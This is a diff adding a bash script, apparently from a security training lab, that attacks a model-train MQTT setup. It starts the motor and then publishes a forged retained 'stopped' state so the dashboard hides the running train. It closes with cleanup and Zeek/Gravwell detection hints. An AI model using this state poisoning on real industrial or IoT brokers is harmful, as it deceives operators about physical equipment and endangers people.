@@ -1,0 +1,45 @@
+#!/usr/bin/env bash
+# Stage 3b — MQTT Retained-Message State Poisoning (V4)
+# Publishes a forged retained state so the operator dashboard shows "stopped"
+# while the train is actually running.
+# Zeek visibility: mqtt.log — PUBLISH with retain=1 on a state topic
+set -euo pipefail
+
+BROKER="${BROKER:-mosquitto}"
+TRAIN="${TRAIN:-t1}"
+
+echo "=== [mqtt-poison] Stage 3b: Retained-message dashboard poisoning ==="
+echo ""
+
+echo "--- Step 1: Start the train so there's something to hide ---"
+mosquitto_pub -h "$BROKER" \
+  -t "choochoo/train/${TRAIN}/cmd/motor" \
+  -m '{"action":"motor","direction":"forward","power":40}'
+sleep 1
+echo "  Train is moving. Dashboard should show power=40."
+echo ""
+
+echo "--- Step 2: Poison the retained state message ---"
+echo "  Publishing forged state with retain=1: power=0, connected=false"
+echo "  Every new subscriber (and page reload) now gets the lie."
+mosquitto_pub -h "$BROKER" -r \
+  -t "choochoo/train/${TRAIN}/state" \
+  -m "{\"train_id\":\"${TRAIN}\",\"direction\":null,\"power\":0,\"connected\":false}"
+echo "  Poisoned. Reload the train UI — it shows stopped. Train is still running."
+echo ""
+
+read -rp "Press Enter to clear the poisoned state and restore truth..."
+echo ""
+
+echo "--- Cleanup: clear the retained message ---"
+mosquitto_pub -h "$BROKER" -r -n \
+  -t "choochoo/train/${TRAIN}/state"
+mosquitto_pub -h "$BROKER" \
+  -t "choochoo/train/${TRAIN}/cmd/stop" \
+  -m '{}'
+echo "  Cleared. Retained state removed; train stopped."
+
+echo ""
+echo "[mqtt-poison] Done. Check mqtt.log on the sensor — look for:"
+echo "  retain=1 PUBLISH on a state topic (not a cmd topic — never legitimate)"
+echo "  Gravwell: tag=zeek json _path=='mqtt' retain==1 | table id.orig_h topic"
